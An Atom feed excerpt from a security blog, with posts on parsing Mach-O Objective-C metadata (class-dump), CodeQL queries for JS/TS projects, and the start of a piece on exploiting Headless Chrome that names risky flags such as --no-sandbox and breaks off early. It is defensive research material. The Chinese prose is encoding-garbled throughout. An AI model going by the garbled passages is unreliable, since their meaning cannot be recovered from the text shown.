loadClassAtAddress:val]</code></p><p>åªè°ƒè¯•ä¸€æ¬¡è¿‡ç¨‹åˆ†æå³å¯:<code> val uint64_t    4335166480 In [2]: hex(4335166480) Out[2]: &#39;0x102656410&#39;</code></p><p>è¿™ä¸ª0x102656410ï¼Œä½¿ç”¨machoviewä¹Ÿèƒ½çœ‹åˆ°ï¼Œè°ƒè¯•+machoviewå¯¹æ¯”çœ‹ï¼Œæ›´å®¹æ˜“ç†è§£ã€‚</p><p><code>loadClassAtAddress</code>æ–¹æ³•åˆ†æï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_class objc2Class;</span><br><span class="line">objc2Class.isa        &#x3D; [cursor readPtr];</span><br><span class="line">objc2Class.superclass &#x3D; [cursor readPtr];</span><br><span class="line">objc2Class.cache      &#x3D; [cursor readPtr];</span><br><span class="line">objc2Class.vtable     &#x3D; [cursor readPtr];</span><br><span class="line">objc2Class.data       &#x3D; [cursor readPtr];</span><br><span class="line">objc2Class.reserved1  &#x3D; [cursor readPtr];</span><br><span class="line">objc2Class.reserved2  &#x3D; [cursor readPtr];</span><br><span class="line">objc2Class.reserved3  &#x3D; [cursor readPtr];</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯è¯»å–å¯¹åº”çš„classç»“æ„ï¼Œè¿™ä¸ªè¿‡ç¨‹å…¶å®å¾ˆçœ¼ç†Ÿï¼Œå¦‚æœè¯»è¿‡iOSé€†å‘çš„ä¹¦ï¼Œæ¯”å¦‚åº†ç¥çš„ä¹¦ï¼Œæœ‰ä¸€ç« ä»‹ç»ocæ–¹æ³•è°ƒç”¨è¿‡ç¨‹çš„ï¼Œä¼šæŠŠoc-&gt;cppä»£ç ï¼Œé‚£é‡Œé¢è¿™ä¸ª oc objectçš„ç»“æ„åˆ†æçš„å¾ˆæ¸…æ¥šã€‚</p><p>ç„¶åè§£æ<code> class-&gt;data</code> å­—æ®µ</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cd_objc2_class_ro_t objc2ClassData;</span><br><span class="line">objc2ClassData.flags         = [cursor readInt32];</span><br><span class="line">objc2ClassData.instanceStart = [cursor readInt32];</span><br><span class="line">objc2ClassData.instanceSize  = [cursor readInt32];</span><br><span class="line"><span class="keyword">if</span> ([<span class="keyword">self</span>.machOFile uses64BitABI])</span><br><span class="line">    objc2ClassData.reserved  = [cursor readInt32];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    objc2ClassData.reserved = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">objc2ClassData.ivarLayout     = [cursor readPtr];</span><br><span class="line">objc2ClassData.name           = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseMethods    = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseProtocols  = [cursor readPtr];</span><br><span class="line">objc2ClassData.ivars          = [cursor readPtr];</span><br><span class="line">objc2ClassData.weakIvarLayout = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseProperties = [cursor readPtr];</span><br></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°class çš„ nameï¼Œmethodsï¼Œprotocol, propertyä¿¡æ¯ ç„¶åè¿”å›è¿™ä¸ªclass</p><p>å±•å¼€è¯´ä¸‹ è·å– methods &amp;&amp; propertyçš„æ—¶å€™</p><ul><li><code>(NSArray *)loadMethodsAtAddress:(uint64_t)address; { return [self loadMethodsAtAddress:address extendedMethodTypesCursor:nil]; }</code></li></ul><p><code>loadMethodsAtAddress :</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">objc2Method.name  &#x3D; [cursor readPtr];</span><br><span class="line">objc2Method.types &#x3D; [cursor readPtr];</span><br><span class="line">objc2Method.imp   &#x3D; [cursor readPtr];</span><br><span class="line">NSString *name    &#x3D; [self.machOFile stringAtAddress:objc2Method.name];</span><br><span class="line">NSString *types   &#x3D; [self.machOFile stringAtAddress:objc2Method.types];</span><br></pre></td></tr></table></figure><p>ä¸€æ ·çš„å¥—è·¯ï¼Œéƒ½æ˜¯è§£æå‡ºæ¥å¯¹åº”çš„å­—æ®µï¼Œç„¶åæŒ‰ç…§è¿™äº›å­—æ®µè¯»å–ä¿¡æ¯<code>(string) CDOCMethod *method = [[CDOCMethod alloc] initWithName:name typeString:types address:objc2Method.imp]; [methods addObject:method]; </code>æœ€åè·å¾—methodsæ•°ç»„ï¼Œç»™å‰é¢å¡«å……classçš„åœ°æ–¹ä½¿ç”¨</p><p><code>loadIvarsAtAddress ,loadPropertiesAtAddress , loadMethodsOfMetaClassAtAddress</code> åŒç†</p><p>è‡³æ­¤ï¼Œclassè§£æå®Œæ¯•</p><h2 id="6-loadCategories"><a href="#6-loadCategories" class="headerlink" title="6. loadCategories"></a>6. loadCategories</h2><p>å…³äºCategories å¯ä»¥çœ‹ <a href="https://zhuanlan.zhihu.com/p/24925196">https://zhuanlan.zhihu.com/p/24925196</a></p><p>å¤„ç†<code> __DATA __objc_catlist section</code> : </p><ul><li>(CDOCCategory *)loadCategoryAtAddress:(uint64_t)address;</li></ul><p>ä¸€æ ·çš„å¤„ç†æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_category objc2Category;</span><br><span class="line">objc2Category.name               &#x3D; [cursor readPtr];</span><br><span class="line">objc2Category.class              &#x3D; [cursor readPtr];</span><br><span class="line">objc2Category.instanceMethods    &#x3D; [cursor readPtr];</span><br><span class="line">objc2Category.classMethods       &#x3D; [cursor readPtr];</span><br><span class="line">objc2Category.protocols          &#x3D; [cursor readPtr];</span><br><span class="line">objc2Category.instanceProperties &#x3D; [cursor readPtr];</span><br><span class="line">objc2Category.v7                 &#x3D; [cursor readPtr];</span><br><span class="line">objc2Category.v8                 &#x3D; [cursor readPtr];</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å’Œå¯¹objc2Classçš„å¤„ç†æœ‰ç‚¹åƒï¼Œå°±æ˜¯å› ä¸ºæ˜¯categoryçš„åŸå› ï¼Œæ‰€ä»¥å­—æ®µæœ‰ä¸åŒï¼Œ ç®€å•çš„ç†è§£æˆ å¤„ç†ä¸€ç§ç‰¹æ®Šçš„classï¼Œå¹¶ä¸”æå–å‡ºç›¸åº”çš„ methods å’Œ propertieså°±è¡Œ</p><p>è‡³æ­¤æ•´ä¸ª processå‡½æ•°çš„å¤„ç†ç»“æŸ</p><h2 id="7-å¤„ç†-or-è¾“å‡º"><a href="#7-å¤„ç†-or-è¾“å‡º" class="headerlink" title="7. å¤„ç† or è¾“å‡º"></a>7. å¤„ç† or è¾“å‡º</h2><p>è¿™éƒ¨åˆ†ä¸»è¦æ˜¯å¤„ç†è¾“å‡ºäº†ï¼Œå¦‚æœæ²¡ä»€ä¹ˆå‚æ•°å°±ç›´æ¥stdoutè¾“å‡ºï¼Œå¦‚æœæœ‰æŒ‡å®šæ–‡ä»¶ç›®å½•ï¼Œå°±éå†ä¹‹å‰processå¾—åˆ°çš„ä¿¡æ¯ï¼Œå†™æ–‡ä»¶(.h)åˆ°æŒ‡å®šçš„ç›®å½•ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/output.png" alt="output"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/24925196">https://zhuanlan.zhihu.com/p/24925196</a></p><p><a href="https://en.wikipedia.org/wiki/Mach-O">https://en.wikipedia.org/wiki/Mach-O</a></p><p><a href="https://iosre.com/">https://iosre.com/</a></p><p><a href="https://evilpan.com/2020/09/06/macho-inside-out/">https://evilpan.com/2020/09/06/macho-inside-out/</a></p><p>iOSåº”ç”¨é€†å‘ä¸å®‰å…¨ (åˆ˜åŸ¹åº†è‘—)</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;roadmap&quot;&gt;&lt;a href=&quot;#roadmap&quot; class=&quot;headerlink&quot; title=&quot;roadmap&quot;&gt;&lt;/a&gt;roadmap&lt;/h1&gt;&lt;p&gt;ä¹‹å‰åœ¨ &lt;a href=&quot;https://iosre.com/&quot;&gt;iosre&lt;/a&gt;çœ‹åˆ°ä¸€å¼ æ¯”è¾ƒç³»ç»Ÿçš„iOSé€†å‘å­¦ä¹ è·¯çº¿å›¾ï¼Œå› ä¸ºæ¥è§¦è¿‡ä¸€æ®µæ—¶é—´macOSä¸ŠæœåŠ¡çš„æ¼æ´æŒ–æ˜ï¼Œæ‰€ä»¥å¯¹*OSå®‰å…¨è¿˜æ˜¯æŒºæœ‰å…´è¶£çš„ï¼Œä¹Ÿä¸€ç›´æƒ³ç³»ç»Ÿæ€§åœ°å­¦ä¹ ä¸‹iOSé€†å‘ï¼Œä¹‹å‰çš„ä¸€ç›´ä¸æˆä½“ç³»ï¼Œä¹Ÿå¾ˆé›¶ç¢ï¼Œæ­£å¥½å¯¹ç€è¿™ä¸ªå›¾é‡æ„ä¸‹çŸ¥è¯†ä½“ç³»ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="iOS" scheme="http://o0xmuhe.me/categories/iOS/"/>
    
    
    <category term="iOS" scheme="http://o0xmuhe.me/tags/iOS/"/>
    
    <category term="é€†å‘" scheme="http://o0xmuhe.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL JS/TS Journey</title>
    <link href="http://o0xmuhe.me/2021/06/01/CodeQL-JS-TS-Journey/"/>
    <id>http://o0xmuhe.me/2021/06/01/CodeQL-JS-TS-Journey/</id>
    <published>2021-06-01T03:43:11.000Z</published>
    <updated>2021-06-09T14:33:55.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å…³äº"><a href="#å…³äº" class="headerlink" title="å…³äº"></a>å…³äº</h1><p>ä¹‹å‰åšè¿‡çš„ä¸€äº›ä½¿ç”¨CodeQLå¯¹JS/TSé¡¹ç›®åšæ‰«æçš„ç¬”è®°ã€‚</p><a id="more"></a><h1 id="å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹"><a href="#å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹" class="headerlink" title="å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹"></a>å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹</h1><p>å¯¹äºJS/TSçš„é¡¹ç›®æ¥è¯´ï¼ŒCodeQLç»Ÿä¸€éƒ½æ˜¯ <code>--language=javascript</code> çš„å‚æ•°å¤„ç†çš„ï¼Œè€Œä¸”å®ƒä¸»è¦æ˜¯æ‰«æï¼Œè§£æï¼Œç„¶åæ„å»ºæ•°æ®åº“ï¼Œå¯¹äºå°é¡¹ç›®ç›´æ¥é»˜è®¤å‚æ•°åº”è¯¥æ˜¯okçš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=javascript &lt;your_prj&gt;</span><br><span class="line"><span class="comment"># codeql database bundle -o &lt;your_prj_db&gt;.zip &lt;your_prj&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯¹äºæ¯”è¾ƒå¤§å‹çš„é¡¹ç›®æ¥è¯´ï¼Œå› ä¸ºCodeQLæ˜¯Javaå†™çš„ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå­˜åœ¨å†…å­˜ä¸è¶³å¯¼è‡´æ„å»ºæ•°æ®åº“å¤±è´¥çš„æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FATAL ERROR: Ineffective mark-compacts near heap <span class="built_in">limit</span> Allocation failed -</span><br><span class="line">JavaScript heap out of memory</span><br></pre></td></tr></table></figure><p>é»˜è®¤ç»™çš„å†…å­˜æ˜¯<code>2400MB</code>ï¼Œå¤§é¡¹ç›®å¿…ç„¶ä¸å¤Ÿå•Šï¼Œæ–‡ä»¶å¤ªå¤šäº†ã€‚</p><p>æ‰¾äº†ä¸€åœˆæ²¡æœ‰è§£å†³æ–¹æ¡ˆï¼Œç´¢æ€§ç›´æ¥æå‡ºJD_GUIæŠŠå®ƒçš„jaråŒ…ç»™åç¼–è¯‘äº†ï¼Œå‘ç°æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡æ§åˆ¶çš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SEMMLE_TYPESCRIPT_RAM=8000</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸ªä¸æ˜¯ç»™JAVAçš„é‚£ä¸ªå†…å­˜è®¾ç½®(<code>-J-Xmx1234M</code>)</strong></p><h1 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h1><h2 id="æ¥å£å‡½æ•°"><a href="#æ¥å£å‡½æ•°" class="headerlink" title="æ¥å£å‡½æ•°"></a>æ¥å£å‡½æ•°</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">interface FooInterface&#123;</span><br><span class="line">4&#x2F;&#x2F;...</span><br><span class="line">&#125;</span><br><span class="line">export interface outerApiConfig &#123;</span><br><span class="line"></span><br><span class="line">4foo: (params: xxxxx) &#x3D;&gt; Promise&lt;&#123; &#x2F;&#x2F; whatever ..&#125;&gt;;</span><br><span class="line">4</span><br><span class="line">4bar: (params: FooInterface) &#x3D;&gt; Promise&lt;&#123; &#x2F;&#x2F; whatever..&#125;&gt;;</span><br><span class="line">4</span><br><span class="line">4&#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿è¿™ä¸ªDemoä¸ºä¾‹ï¼Œå¾ˆå¤šæ¥å£å‡½æ•°ç»Ÿä¸€å¯¼å‡ºï¼Œéœ€è¦å€ŸåŠ©<code>InterfaceDeclaration</code> æ¥æ‰¾ï¼Œä¸è¿‡æˆ‘çš„æ–¹æ³•æœ‰ç‚¹â€œç¬¨â€ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import javascript</span><br><span class="line"></span><br><span class="line">predicate isOuterAPIs(Function f)&#123;</span><br><span class="line">     exists(InterfaceDeclaration apis |</span><br><span class="line">         apis.getIdentifier().toString() = "outerApiConfig" and</span><br><span class="line">         apis.getAMember().getName() = f.getName()</span><br><span class="line">     )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where isOuterAPIs(f)</span><br><span class="line"><span class="keyword">select</span> f.getName()</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œå®ç°å¾ˆç²—æš´ï¼Œå°±æ˜¯é™åˆ¶å‡½æ•°å(å­—ç¬¦ä¸²å€¼)å’ŒInterfaceé‡Œæˆå‘˜åå­—(å­—ç¬¦ä¸²å€¼)ä¸€è‡´ï¼Œå°±è®¤ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯å¯¼å‡ºæ¥å£ä¸­çš„å‡½æ•°ã€‚</p><h2 id="ç‰¹å®šå‚æ•°çš„å¤„ç†"><a href="#ç‰¹å®šå‚æ•°çš„å¤„ç†" class="headerlink" title="ç‰¹å®šå‚æ•°çš„å¤„ç†"></a>ç‰¹å®šå‚æ•°çš„å¤„ç†</h2><p>åœ¨æˆ‘çš„éœ€æ±‚ä¸­ï¼Œæˆ‘éœ€è¦é‡ç‚¹å…³æ³¨ï¼Œå‚æ•°ä¸­å¸¦æœ‰è·¯å¾„çš„å‡½æ•°ï¼Œæ¢è¨€ä¹‹å°±æ˜¯éœ€è¦è¯†åˆ«å‡ºè¿™ä¹ˆå¤šæ¥å£å‡½æ•°ä¸­ï¼Œå‚æ•°å¸¦æœ‰<code>path</code>çš„æƒ…å†µï¼Œé‚£ä¹ˆå¾ˆç›´æ¥çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æ­£åˆ™ï¼Œä½†æ˜¯åœ¨å®é™…çš„åœºæ™¯ä¸‹ï¼Œä½ ä¼šå‘ç°ä»£ç çœŸçš„å†™å‡ºäº†â€œèŠ±â€ï¼Œä¸æ˜¯å¸¸è§„çš„queryèƒ½è¦†ç›–çš„ã€‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">foo: <span class="function">(<span class="params">params: WTFParams</span>) =&gt;</span> <span class="built_in">Promise</span>&lt;....&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bar: <span class="function">(<span class="params">params: &#123; arg: <span class="built_in">string</span> &#125;</span>) =&gt;</span> <span class="built_in">Promise</span>&lt;&#123; ...&#125;&gt;;</span><br><span class="line">                                           </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">magic</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å‚æ•°æ˜¯ä¸€ä¸ªinterfaceï¼Œä½ éœ€è¦å¯¹è¿™ä¸ªinterfaceå†é™åˆ¶ï¼Œå³è¿™ä¸ªinterfaceçš„æˆå‘˜æ˜¯ä¸æ˜¯path</p></li><li><p>å‚æ•°ç›´æ¥å°±æ˜¯ {arg : string} è¿™ç±»æƒ…å†µ</p></li><li><p>å¥‡æ€ªçš„å‡½æ•°å†™æ³•ï¼Œå‡½æ•°ä½“åœ¨returné‡Œ</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class PathParamInterfaceType extends InterfaceType&#123;</span><br><span class="line">    PathParamInterfaceType()&#123;</span><br><span class="line">        getInterface().getAMember().getName().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isParamPath(Function f)&#123;</span><br><span class="line">    (</span><br><span class="line">        f.getAParameter().getType() instanceof PathParamInterfaceType</span><br><span class="line">        or</span><br><span class="line">        f.getAParameter().getType().toString().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    ) or</span><br><span class="line">    (</span><br><span class="line">        f.getNumParameter() = 0</span><br><span class="line">        and</span><br><span class="line">        f.getAReturnStmt().getExpr().(Function).getAParameter().getType().toString().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¿…é¡»ä¾èµ–TaintTrackingå—"><a href="#å¿…é¡»ä¾èµ–TaintTrackingå—" class="headerlink" title="å¿…é¡»ä¾èµ–TaintTrackingå—"></a>å¿…é¡»ä¾èµ–TaintTrackingå—</h2><p>æœ€åä¸€ä¸ªé—®é¢˜æ¯”è¾ƒç®€å•äº†ï¼Œå°±æ˜¯æœ‰äº†sourceï¼Œç„¶åå†æ‰¾åˆé€‚çš„sinkï¼Œçœ‹æœ‰æ²¡æœ‰è·¯å¾„å°±è¡Œäº†ï¼›ä½†æ˜¯å…¶å®è¿˜æœ‰ä¸€ç§åŠæ³•ä¼šæ¥å¾—æ›´ç›´æ¥ï¼Œå°±æ˜¯åˆ©ç”¨ä¼ é€’é—­åŒ…ï¼Œä½†æ˜¯ä¼šå¸¦æ¥æ¯”è¾ƒå¤šçš„è¯¯æŠ¥ï¼Œå¥½å¤„æ˜¯å®ç°èµ·æ¥ç®€å•ï¼Œæƒ³è¦æ’é™¤è¯¯æŠ¥ï¼Œåªéœ€è¦å¢åŠ é™åˆ¶å³å¯ï¼Œçœ‹å…·ä½“éœ€æ±‚å§ï¼Œå“ªä¸ªæ–¹æ³•åˆé€‚ç”¨å“ªä¸ªã€‚</p><p>CodeQLçš„JS/TSéƒ¨åˆ†å®ç°ä¸å¦‚cppå¤šï¼Œæ‰€ä»¥æœ‰äº›predicateéœ€è¦è‡ªå·±æ‰‹åŠ¨å®ç°ï¼Œæ¯”å¦‚ç”¨cppåšqueryå¯ä»¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FunctionCall getFunctionToACall(FunctionCall fc)&#123;</span><br><span class="line">  result &#x3D; fc.getBasicBlock().getEnclosingFunction().getACallToThisFunction()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select</span><br><span class="line">        getFunctionToACall*(FunctionCall fc)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯JS/TSéƒ¨åˆ†æ²¡æœ‰<code>getACallToThisFunction</code> ï¼Œæ ¹æ®åŸç†ï¼Œæ‰‹åŠ¨å®ç°ä¸€ä¸ªå³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CallExpr getACallToThisFunction(Function f)&#123;</span><br><span class="line">    exists( CallExpr c |</span><br><span class="line">        c.getCalleeName() &#x3D; f.getName() and</span><br><span class="line">        result &#x3D; c</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CallExpr getFunctionToACall(CallExpr call)&#123;</span><br><span class="line">    result &#x3D; getACallToThisFunction(call.getEnclosingFunction())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¦æŸ¥è¯¢fooå‡½æ•°çš„ä¼ é€’é—­åŒ…ï¼Œå°±å¯ä»¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from CallExpr <span class="keyword">call</span></span><br><span class="line"><span class="keyword">where</span> call.getCalleeName() = <span class="string">"foo"</span></span><br><span class="line"><span class="keyword">select</span> getFunctionToACall*(<span class="keyword">call</span>)</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/7482">https://xz.aliyun.com/t/7482</a></p><p><a href="https://securitylab.github.com/tools/codeql">CodeQL for research</a></p><p><a href="https://ctftime.org/writeup/22177">https://ctftime.org/writeup/22177</a></p><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md">https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md</a></p><p><a href="https://codeql.github.com/docs/codeql-cli/">https://codeql.github.com/docs/codeql-cli/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å…³äº&quot;&gt;&lt;a href=&quot;#å…³äº&quot; class=&quot;headerlink&quot; title=&quot;å…³äº&quot;&gt;&lt;/a&gt;å…³äº&lt;/h1&gt;&lt;p&gt;ä¹‹å‰åšè¿‡çš„ä¸€äº›ä½¿ç”¨CodeQLå¯¹JS/TSé¡¹ç›®åšæ‰«æçš„ç¬”è®°ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ç¬”è®°" scheme="http://o0xmuhe.me/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CodeQL" scheme="http://o0xmuhe.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>Exploit Headless Chrome</title>
    <link href="http://o0xmuhe.me/2021/05/26/Chrome-headless-exploit/"/>
    <id>http://o0xmuhe.me/2021/05/26/Chrome-headless-exploit/</id>
    <published>2021-05-26T07:26:26.000Z</published>
    <updated>2021-06-23T09:53:13.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>Chrome M59å¼•å…¥äº† Headless Chromeï¼Œè‡³æ­¤å¯ä»¥åœ¨æ— GUIçš„ç¯å¢ƒä¸‹ä½¿ç”¨Chromeï¼Œæå¤§çš„æ–¹ä¾¿äº†è‡ªåŠ¨åŒ–æµ‹è¯•å·¥ä½œï¼Œä¹Ÿå¯ä»¥ç”¨äºé¢„è§ˆæœåŠ¡ï¼Œæˆ–è€…ç½‘ç»œçˆ¬è™«ã€‚</p><a id="more"></a><p>å‰ç«¯å¹¶ä¸æ˜¯æˆ‘çš„å¼ºé¡¹ï¼Œæˆ‘åœ¨ä¸Šç½‘å†²æµªçš„æ—¶å€™å‘ç°ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç°è±¡ï¼š</p><ol><li>å¾ˆå¤šæŠ€æœ¯æ–‡ç« ç›¸äº’å‚è€ƒï¼Œæœ‰äº›ä»£ç è‡ªç„¶ä¹Ÿç›´æ¥å¤åˆ¶ç²˜è´´ä½¿ç”¨</li><li>Headless Chromeè‡ªç„¶ä¹Ÿæ˜¯è¿™æ ·ï¼Œä¸€äº›ä¸å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ä¹Ÿè¢«é”™è¯¯åœ°ä¼ æ’­</li></ol><p>äºæ˜¯æœ‰äº†æœ¬æ–‡ï¼Œä»¥åŠä¸€äº›ä¸ªäººçš„æ€è€ƒã€‚</p><h2 id="æ€è€ƒ-ğŸ¤”"><a href="#æ€è€ƒ-ğŸ¤”" class="headerlink" title="æ€è€ƒ ğŸ¤”"></a>æ€è€ƒ ğŸ¤”</h2><p>é¦–å…ˆï¼Œåœ¨Googleæœç´¢Headless Chromeç›¸å…³çš„æŠ€æœ¯æ–‡ç« ï¼Œä¼šè·³å‡ºæ¥å®˜æ–¹æ–‡æ¡£ä»¥åŠå„ç§æŠ€æœ¯æ–‡ç« :</p><p>(å…³é”®è¯é¡ºåºåäº†ï¼Œä¸è¿‡ä¸å½±å“ XD )</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.41.22@2x.png" alt="CleanShot 2021-05-26 at 15.41.22@2x"></p><p>Headless Chromeå…¶å®å°±æ˜¯ä»å‘½ä»¤è¡Œå¯åŠ¨Chromeï¼Œä¼ é€’äº†<code>--headless</code>çš„å‚æ•°ï¼Œé‚£ä¹ˆå¯¹äºChromeæ¥è¯´ï¼Œæœ‰å¾ˆå¤šå‚æ•°ï¼Œä½†æ˜¯æœ‰é‚£ä¹ˆå‡ ä¸ªå‚æ•°éå¸¸å±é™©ï¼Œæ¯”å¦‚ : <code>--no-sandbox</code>ï¼Œ<code>--disable-web-security</code>ï¼Œä»¥åŠå¼€å¯è°ƒè¯•ç«¯å£â€¦</p><p>åœ¨çœ‹äº†å¾ˆå¤šç½‘ä¸Šçš„æ–‡ç« åï¼Œæˆ‘å‘ç°æœ‰ä¸å°‘ä»£ç æ˜¯é‡å¤çš„ï¼ˆå…³é”®é€»è¾‘ï¼‰ï¼Œæ¯”å¦‚è¿™ç¯‡:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.47.37@2x.png" alt="CleanShot 2021-05-26 at 15.47.37@2x"></p><p>å¯¹äºé”™è¯¯çš„å‚æ•°ä¹Ÿæ˜¯ä¸€æ 